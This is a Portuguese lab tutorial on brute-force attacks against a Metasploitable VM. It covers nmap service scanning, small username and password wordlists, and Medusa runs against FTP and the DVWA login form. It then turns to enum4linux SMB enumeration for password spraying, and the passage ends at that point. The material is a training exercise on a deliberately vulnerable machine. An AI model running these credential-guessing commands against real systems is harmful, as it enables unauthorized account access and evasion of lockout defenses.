Simulação de Ataque de Força Bruta, utilizando a ferramenta Medusa no Kali Linux.

### Requisitos

- Software de Máquina Virtual (no caso será utilizado o VirtualBox, que você pode baixar clicando [aqui](https://www.virtualbox.org/wiki/Downloads)).
- VM Kali Linux (link para download [aqui](https://www.kali.org/get-kali/#kali-virtual-machines)).
- VM Metasploitable (link para download [aqui](https://sourceforge.net/projects/metasploitable/files/)).

### ⚠️ Observações

- Kali Linux: login e senha padrão → **kali**
- Metasploitable: login e senha padrão → **msfadmin**

### Técnicas utilizadas

- Password Spraying e Credential Stuffing

### Ataque de Enumeração

**1. Varredura com Nmap**

A primeira parte desta simulação é a enumeração, que consiste em descobrir quais serviços estão disponíveis no sistema alvo. Para isso é utilizado o comando **nmap**, que vai escanear as portas dos principais protocolos de rede como FTP, SSH, HTTP, HTTPS e SMB. O parâmetro **-sV** serve para identificar a versão do serviço que está rodando em cada porta:

Para isso, utilize o seguinte comando:

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.102
```

Este comando vai mostrar qual o estado das portas como "**open**".

![Varredura Nmap](./images/01_varredura_nmap.png)

Se quiser validar se o protocolo FTP realmente está realmente aberto, basta executar o comando:

```bash
ftp 192.168.56.102
```

**2. Wordlist**

Conforme a imagem anterior, sabemos que o serviço está aberto mas não temos como saber qual login e senha correto. Diante disso, vamos criar duas Wordlists, uma contendo nomes de usuários e outra contendo senhas. 
**Wordlists** são arquivos com usuários e senhas possíveis. Para isso vamos utilizar os seguintes passos abaixo:

Comando para criar lista de **usuários**:

```bash
echo -e “user\nmsfadmin\nadmin\nroot” > users.txt
```

Comando para criar lista de **senhas**:

```bash
echo -e “123456\npassword\nqwerty\nmsfadmin” > pass.txt
```

**3. Efetuando o ataque com Medusa**

Criada as wordlists, agora é hora de executar o **Medusa**, que vai simular combinações entre usuários e senhas. O comando é:

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

Explicando os parâmetros:
- `-h 192.168.56.102`: define o host alvo. É o endereço IP da máquina que você quer testar.
- `-U users.txt`: informa o arquivo que contém a lista de usuários que serão testados.
- `-P pass.txt`: informa o arquivo que contém a lista de senhas que serão testadas.
- `-M ftp`: define o módulo (protocolo/serviço) que será atacado. Aqui, o ataque é contra o serviço FTP.
- `-t 6`: define o número de threads simultâneas. Em outras palavras: quantas tentativas paralelas o Medusa fará ao mesmo tempo.

Após executar o comando procurar onde ele teve “**SUCCESS**” na investida, bem como as combinações de usuário e senha, conforme mostra a imagem abaixo:

![Varredura Medusa](./images/02_varredura_medusa.png)

Se tentar acessar agora a VM Metasploitable via protocolo FTP, e inserir as credenciais em que o Medusa obteve sucesso, vai obter êxito no ataque.

```bash
ftp 192.168.56.102
```

### Ataques de força bruta aplicados em formulários de login em sistemas web

Para testar essa ferramenta, utilizaremos um formulário web do próprio metasploitable para teste. Para aceesar, abra um navegador e acesse através do seguinte endereço:

```bash
http://192.168.56.102/dvwa/login.php
```

**1. Criação de Wordlist**

Comando para criar lista de **usuários**:

```bash
echo -e “user\nmsfadmin\nadmin\nroot” > users.txt
```

Comando para criar lista de **senhas**:

```bash
echo -e “123456\npassword\nqwerty\nmsfadmin” > pass.txt
```

**2. Executar o ataque**

Agora, utilizar o Medusa para simular combinações entre usuários e senhas, através do comando:

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -m PAGE:'/dvwa/login.php' \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m FAIL:'Login failed' \
 -t 6
```

Explicando os parâmetros:
- `-h 192.168.56.102`: endereço do alvo.
- `-U users.txt`: arquivo com logins.
- `-P pass.txt`: arquivo com senhas.
- `-M http`: módulo http, ou seja, aplicações web.
- `m PAGE:'/dvwa/login.php'`: caminho do formulário de login do servidor.
- `-m FORM:'username=^USER^&password=^PASS^&Login=Login'`: corpo da requisição.
- `-m FAIL:'Login failed'`: qual é a resposta pra tentativa de falha.
- `-t 6`: usa seis conexões simultâneas para acelerar o processo.

Onde está “**SUCCESS**” ele encontrou credenciais válidas:

![Varredura Medusa](./images/03_varredura_medusa.png)

Para validar, acesse com as seguintes credenciais de login: admin e senha: password.

### Ataque em cadeia, enumeração smb + password spraying

O protocolo **SMB** significa *Server Message Block*. É um protocolo do Windows utilizado para compartilhar arquivos, pastas, impressoras e também para realizar a autenticação de usuários e comunicação entre máquinas Windows e Linux via samba. Pode ser considerado uma porta para compartilhar recursos da rede interna.

Vamos supor que você descobriu em uma rede um smb ativo. O próximo passo, é **descobrir os usuários existentes no sistema** e **testar senhas fracas** em todos eles discretamente, sem bloquear nenhuma conta.

O **Password Spraying** é uma *técnica furtiva de ataque às senhas*. Ao invés de tentar muitas senhas para um único usuário, o que leva ao bloqueio de tentativas, a gente vai testar **uma senha comum para muitos usuários diferentes**.

Para isso, utile o seguinte comando:

```bash
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```

Explicando os parâmetros:
- `enum4linux`: ferramenta principal para enumeração.
- `-a`: vai ativar todas as técnicas possíveis para enumeração.
- `192.168.56.102`: ip do alvo.
- `tee enum4_output.txt`: gravar a saída do comando em um arquivo.

Depois ler o conteúdo com o seguinte comando:

```bash
less enum4_output.txt
```

Ele vai criar uma lista com possíveis alvos:
